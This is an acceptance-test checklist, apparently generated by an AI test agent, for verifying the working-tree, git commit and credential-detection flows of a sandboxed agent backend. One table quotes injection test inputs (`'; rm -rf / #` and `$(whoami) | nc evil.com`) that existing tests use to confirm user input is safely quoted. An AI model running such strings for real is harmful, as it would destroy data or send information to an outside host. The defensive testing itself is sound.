---
stepsCompleted:
  - 'step-01-preflight-and-context'
  - 'step-02-generation-mode'
  - 'step-03-test-strategy'
  - 'step-04-generate-tests'
  - 'step-04c-aggregate'
  - 'step-05-validate-and-complete'
lastStep: 'step-05-validate-and-complete'
lastSaved: '2026-07-16'
workflowType: 'testarch-atdd'
storyId: '6.4'
storyKey: '6-4-verify-working-tree-commit-and-credential-flows'
storyFile: '_bmad-output/implementation-artifacts/6-4-verify-working-tree-commit-and-credential-flows.md'
atddChecklistPath: '_bmad-output/test-artifacts/atdd-checklist-6-4-verify-working-tree-commit-and-credential-flows.md'
generatedTestFiles:
  - 'apps/agent-be/src/sandbox/sandbox.service.nfr-s1.spec.ts'
  - 'apps/agent-be/src/streaming/agent.service.unit.spec.ts'
inputDocuments:
  - '_bmad-output/implementation-artifacts/6-4-verify-working-tree-commit-and-credential-flows.md'
  - '_bmad-output/project-context.md'
  - '_bmad-output/decision-policy.md'
  - 'apps/agent-be/src/sandbox/sandbox.service.ts'
  - 'apps/agent-be/src/streaming/agent.service.ts'
  - 'apps/agent-be/test/helpers/mock-daytona.ts'
---

# ATDD Checklist - Epic 6, Story 6.4: Verify Working Tree, Commit, and Credential Flows

**Date:** 2026-07-16
**Author:** Marius
**Primary Test Level:** Unit (SDK-boundary + service-level, Jest + mock-daytona)

---

## Story Summary

Verifies that the working-tree tracking (Story 3.6), manual commit (Story 3.6), and credential detection (Story 3.7) flows work correctly against sandbox-based execution (Stories 6.1–6.3). The story is verification, not new implementation — the only new work is the F4 (empty error message) and F5 (exitCode check) fidelity-audit fixes, plus two host-filesystem regression guards (AC-4).

**As a** developer on the bmad-easy team
**I want** the working-tree tracking, manual commit, and credential detection flows verified against sandbox-based execution
**So that** the Stories 3.6, 3.7, and 3.10 flows that were broken by host-based execution now work correctly

---

## Acceptance Criteria

1. **AC-1:** Working-tree tracking fires on agent file modifications (`WORKING_TREE_DIRTY` with changed files).
2. **AC-2:** Manual commit works inside the sandbox (actual changes to commit, user's git identity, indicator resets to clean).
3. **AC-3:** Credential failure detection triggers on 401/403 (`CREDENTIAL_FAILURE` / `ACCESS_DENIED` emit to browser).
4. **AC-4:** No host filesystem operations — all file operations happen inside the sandbox.

---

## Story Integration Metadata

- **Story ID:** `6.4`
- **Story Key:** `6-4-verify-working-tree-commit-and-credential-flows`
- **Story File:** `_bmad-output/implementation-artifacts/6-4-verify-working-tree-commit-and-credential-flows.md`
- **Checklist Path:** `_bmad-output/test-artifacts/atdd-checklist-6-4-verify-working-tree-commit-and-credential-flows.md`
- **Generated Test Files (scaffolded into existing files):**
  - `apps/agent-be/src/sandbox/sandbox.service.nfr-s1.spec.ts` (F4 + F5 blocks appended)
  - `apps/agent-be/src/streaming/agent.service.unit.spec.ts` (Task 3 block inserted)

---

## Test Strategy (Step 3)

**Detected stack:** `fullstack` (Nx monorepo: Next.js `apps/web` + NestJS `apps/agent-be`). This story is **backend-only** (agent-be). No browser/E2E tests are in scope (see E2E deferral check below).

| AC | Test Level | File | Priority | New / Existing |
| --- | --- | --- | --- | --- |
| AC-1 | Unit | `agent.service.unit.spec.ts` (lines 681–830) | P0 | Existing — run as regression |
| AC-2 | Unit | `manual-commit.service.spec.ts` + `sandbox.service.nfr-s1.spec.ts` (F4) | P0 | Existing + new F4 scaffolds |
| AC-3 | Unit | `tool-pill-classifier.service.spec.ts` (lines 205–329) | P0 | Existing — run as regression |
| AC-4 | Unit | `agent.service.unit.spec.ts` (Task 3) + `sandbox.service.nfr-s1.spec.ts` (F5) | P0 | New scaffolds |

---

## E2E Deferral Check (recorded per ATDD instruction)

Before deferring E2E coverage, each AC was checked against browser-level mock patterns. **No browser-level mock can simulate any of these ACs** — all four depend on sandbox-internal state that a browser cannot reach or fabricate:

| AC | Browser-mock feasibility | Verdict |
| --- | --- | --- |
| AC-1 (working-tree) | The `WORKING_TREE_DIRTY` emission is triggered by the sandbox-agent producing file-modifying tool calls inside the sandbox filesystem. A browser cannot simulate the sandbox-agent writing files to the sandbox repo. The mock event-bridge + mock-daytona unit tests DO cover it. | Deferred — no browser mock covers it |
| AC-2 (manual commit) | A browser can trigger the save UI and observe `MANUAL_SAVE_SUCCEEDED`, but "actual changes committed inside the sandbox" + "git identity" require a real Daytona sandbox. The unit tests cover the flow with mocks. | Deferred — no browser mock covers the sandbox-internal commit |
| AC-3 (credential detection) | Triggered by git 401/403 inside the sandbox. A browser cannot simulate the sandbox-internal git failure; the classifier inspects sandbox-agent JSONL tool-call results. | Deferred — no browser mock covers it |
| AC-4 (no host fs) | A code-level invariant (no `tmpdir`/host imports, `cwd: 'repo'`, `sandboxId` args). Not browser-observable. | N/A — unit-only |

**Conclusion:** E2E is deferred for all ACs. Real-service E2E against a live Daytona sandbox is **Story 6.5** scope (explicitly out of scope per story dev notes). The unit-level mock-daytona + mock event-bridge tests are the highest-fidelity verification possible without a real sandbox.

---

## Test Scaffolds Activated (Story 6.4)

All scaffolds were activated by removing `.skip` alongside the corresponding production task. Tests now run as part of the regular suite.

### F4 — `commit()` failure-path tests (2 tests)

**File:** `apps/agent-be/src/sandbox/sandbox.service.nfr-s1.spec.ts` (appended describe block)

- **Test:** `[P0] commit() throws a non-empty diagnostic (incl. exit code) when git add fails with empty result`
  - **Verifies:** F4 fix (Task 1.2) — `response.result || \`git ${step} failed (exit code ${response.exitCode})\`` fallback surfaces the exit code when `result` is empty.
- **Test:** `[P0] commit() throws the git commit failure message when git commit fails`
  - **Verifies:** The `git commit` failure path propagates the result message; guards against a future regression masking commit failures.

### F5 — `listSkills()` failure-path tests (3 tests)

**File:** `apps/agent-be/src/sandbox/sandbox.service.nfr-s1.spec.ts` (appended describe block)

- **Test:** `[P0] listSkills() returns [] and logs warn when executeCommand rejects`
  - **Verifies:** The catch-block silent-swallow contract is an explicit, asserted behavior (project-context.md "logger.warn() in catch blocks that return a default value").
- **Test:** `[P0] listSkills() returns [] when ls fails with non-zero exitCode and empty result`
  - **Verifies:** Non-zero exitCode with empty stdout returns `[]`.
- **Test:** `[P0] listSkills() returns [] when ls fails with non-zero exitCode and stdout output (exitCode gate)`
  - **Verifies:** F5 fix (Task 2.2) — `if (response.exitCode !== 0) return [];` before reading `result`.

### Task 3 — Host-filesystem regression guards (2 tests)

**File:** `apps/agent-be/src/streaming/agent.service.unit.spec.ts` (inserted describe block before the Story 6.3 AC-4 block)

- **Test:** `[P0] streamAgentEvents receives cwd: "repo" (agent runs inside the sandbox, not on the host)`
  - **Verifies:** Task 3.1 — `buildAgentCommand()` runs inside the sandbox (`cwd: REPO_SUBDIRECTORY`), not on the host.
- **Test:** `[P0] getWorkingTreeStatus is called with the active run sandboxId, not a host path`
  - **Verifies:** Task 3.2 — working-tree operations target the sandbox filesystem via `sandboxId`, not a host path.

---

## Regression Guards — Uniform Command-Execution Guard Template

Per the ATDD instruction, regression guards for code that executes external commands with user-controlled input must apply a uniform template at every call site: **credential-isolation** (no credentials leak via command arguments or environment variables) **and input-injection** (malicious input is safely quoted and cannot alter the command's behavior).

| Call site | User-controlled input | Credential-isolation guard | Input-injection guard | Status |
| --- | --- | --- | --- | --- |
| `AgentService.buildAgentCommand()` → `streamAgentEvents` | user `message` (→ `--prompt`) | Existing 6.3 block (lines 1330–1369): no `DATABASE_URL`/`AUTH_SECRET`/`DAYTONA_API_KEY`/`ANTHROPIC_API_KEY`/`GITHUB_TOKEN` in command | Existing 6.3 block (lines 1371–1409): `'; rm -rf / #` and `$(whoami) \| nc evil.com` safely single-quoted | Already covered — Task 3 extends with `cwd` + `sandboxId` invariants |
| `SandboxService.commit()` | platform-generated message (not user-controlled) | Existing nfr-s1 block (lines 169–186): no platform credentials in `git add`/`git commit` | `shellQuote(message)` (existing) | Already covered — F4 tests extend with failure-path diagnostics |
| `SandboxService.injectGitConfig()` | git `user.name`/`user.email` | Existing nfr-s1 block (lines 147–167) | `shellQuote(name/email)` (existing) | Already covered |
| `SandboxService.listSkills()` | none (constant command) | Existing nfr-s1 block (lines 188–201) | N/A (constant) | Already covered — F5 tests extend with exitCode gate |

**No new credential-isolation or input-injection guards were needed** — the uniform template is already applied at every command-execution call site by the existing Story 3.8/3.10/6.1/6.3 regression guards. The new scaffolds extend the template with failure-path (F4/F5) and sandbox-targeting (Task 3) invariants, not duplicate credential/injection checks.

---

## Sibling-Pattern Consultation (Step)

Before writing the regression guards, sibling test files in the same directories were consulted for established guard patterns and regex conventions:

- **`sandbox.service.nfr-s1.spec.ts`** — `createMockDaytonaWithSandbox()` factory, `mockSandbox.process.executeCommand.mockResolvedValueOnce(...)` for sequential responses, `new SandboxService(mockDaytona as unknown as Daytona)` construction, and the `injectGitConfig()` failure-path test (lines 235–251) as the F4 pattern. Regex convention: `expect(...).not.toMatch(/--author=|bmad-easy|platform@/)`, `expect(npmInstallCmd).toMatch(/@anthropic-ai\/claude-code@\d+\.\d+\.\d+/)`.
- **`agent.service.unit.spec.ts`** — `captureCommand()` helper for `streamAgentEvents` params, `createMockEventBridge()` for AG-UI event feeding, `jest.spyOn(sandboxFake, 'getWorkingTreeStatus')`, and `jest.spyOn(agentService['logger'], 'warn')` (line 780).
- **Logger-spy convention** (cross-file): `jest.spyOn(service['logger'], 'warn').mockImplementation(() => undefined)` — established in `tool-pill-classifier.service.spec.ts:189` and `agui-event-bridge.service.spec.ts:147`. Applied to the F5 `listSkills()` warn assertion rather than reintroducing a hand-rolled pattern.

---

## Decision Records

- **Decision (DP-2):** Story Task 3.2 prescribes verifying both `getWorkingTreeStatus` AND `commit` are called with `sandboxId` in `agent.service.unit.spec.ts`. `AgentService` does not call `commit` — `ManualCommitService` does, and its existing tests (`manual-commit.service.spec.ts`) already pass `sandboxId` through `SandboxServiceFake.getCommitCalls()`. Semantic intent (verify sandbox-targeted execution) over literal text: the `getWorkingTreeStatus` assertion is scaffolded in `agent.service.unit.spec.ts`; the `commit` assertion is not duplicated (the story marks `manual-commit.service.spec.ts` as NOT modified). Recorded in the Task 3.2 scaffold comment.
- **Decision (DP-3):** F4 fix pattern `response.result || \`git ${step} failed (exit code ${response.exitCode})\`` is the simplest option (no SDK changes, no new fields) — applied as the red-test contract.
- **Decision (DP-4):** Test-only scaffolding placement (appended describe blocks in existing files, `it.skip()` alias choice) decided autonomously — `it.skip()` matches the codebase's `it()`/`describe()` convention; it is the Jest alias for `test.skip()`.

---

## Implementation Checklist (Task-by-Task Activation)

### Task 1 — Fix F4: `commit()` failure-path tests + empty-error-message fix (AC-2)

**File:** `apps/agent-be/src/sandbox/sandbox.service.nfr-s1.spec.ts`

- [x] **1.1 (activate):** Removed `it.skip` → `it` for both F4 tests.
- [x] **1.2 (production fix):** In `sandbox.service.ts` `commit()`, changed both throw sites to `throw new Error(response.result || \`git ${step} failed (exit code ${response.exitCode})\`)`.
- [x] F4 tests pass.

### Task 2 — Fix F5: `listSkills()` catch-block + exitCode tests (AC-4)

**File:** `apps/agent-be/src/sandbox/sandbox.service.nfr-s1.spec.ts`

- [x] **2.1 (activate):** Removed `it.skip` → `it` for all three F5 tests.
- [x] **2.2 (production fix):** In `sandbox.service.ts` `listSkills()`, added `if (response.exitCode !== 0) { return []; }` before `const output = response.result.trim();`.
- [x] F5 tests pass.

### Task 3 — Verify no host filesystem operations (AC-4)

**File:** `apps/agent-be/src/streaming/agent.service.unit.spec.ts`

- [x] **3.1 (activate):** Removed `it.skip` → `it` for the `cwd: "repo"` test. Passes (regression guard).
- [x] **3.2 (activate):** Removed `it.skip` → `it` for the `getWorkingTreeStatus ... sandboxId` test. Passes (regression guard).
- [x] No production change required (regression guards for the existing sandbox-based execution).

### Regression suite (AC-1, AC-2, AC-3) — run unchanged

- [x] Ran the existing regression tests cited in the story dev notes (no modifications):
  - `agent.service.unit.spec.ts` lines 681–916 (AC-1 working-tree, AC-3 credential)
  - `manual-commit.service.spec.ts` (AC-2 manual commit)
  - `tool-pill-classifier.service.spec.ts` lines 205–329 (AC-3 credential detection)
- [x] All pass without modification.

---

## Running Tests

```bash
# Run all agent-be tests (full regression + scaffolds skipped)
yarn nx test agent-be

# Run the two scaffolded files only
yarn nx test agent-be -- --testPathPattern="sandbox.service.nfr-s1.spec|agent.service.unit.spec"

# Run a single activated test (example: F4 git-add after activating 1.1)
yarn nx test agent-be -- --testPathPattern="sandbox.service.nfr-s1.spec" --testNamePattern="non-empty diagnostic"
```

---

## Test Execution Evidence

### Initial Scaffold Review

**Command:** `yarn nx test agent-be -- --testPathPattern="sandbox.service.nfr-s1.spec|agent.service.unit.spec" --skipNxCache`

**Baseline (scaffolds skipped, before activation):**

```
Test Suites: 32 passed, 32 total
Tests:       7 skipped, 782 passed, 789 total
```

- Total tests: 789
- Skipped: 7 (the Story 6.4 scaffolds — expected before activation)
- Passing: 782 (baseline preserved — no existing test broken)

### Post-Activation (all scaffolds activated + production fixes applied)

All 7 scaffolds activated, F4 + F5 production fixes applied. Full suite green — see Step 7 regression run in the story Dev Agent Record.

---

## Notes

- This story is **verification, not new implementation**. AC-1/AC-2/AC-3 are already covered by existing tests added in Story 6.3 — run as a regression suite. The only new tests are the F4/F5 SDK-boundary tests and the Task 3 host-fs guards.
- The `commit` sandboxId assertion from Task 3.2 is covered by `manual-commit.service.spec.ts` (not duplicated in `agent.service.unit.spec.ts`) — see DP-2 decision above.
- Real-service E2E against a live Daytona sandbox is Story 6.5 scope (out of scope here).

---

**Generated by BMad TEA Agent** - 2026-07-16
